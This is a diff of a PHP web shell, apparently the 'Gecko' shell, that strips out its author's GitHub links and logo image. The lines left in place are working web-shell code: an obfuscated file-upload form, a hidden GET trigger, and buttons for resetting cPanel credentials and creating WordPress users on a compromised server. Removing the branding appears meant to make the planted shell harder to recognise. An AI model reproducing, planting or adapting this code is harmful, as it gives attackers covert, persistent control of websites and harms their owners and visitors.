@@ -616,9 +616,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
-            <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
-            <li class="logo-gecko"><img width="400" height="400" src="//raw.githubusercontent.com/MadExploits/Gecko/main/gecko1.png" align="right"></li>
-            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
+             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                 <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
             </form>
         </ul>
@@ -640,8 +638,7 @@ if ($_GET['don'] == true) {
             <li><a href="//hashes.com/en/tools/hash_identifier" class="btn-submit"><i class="fa-solid fa-code"></i> HASH IDENTIFIER</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> CPANEL RESET</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
-            <li><a href="//github.com/MadExploits/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
-        </ul>
+            </ul>
     </div>
 
     <?php
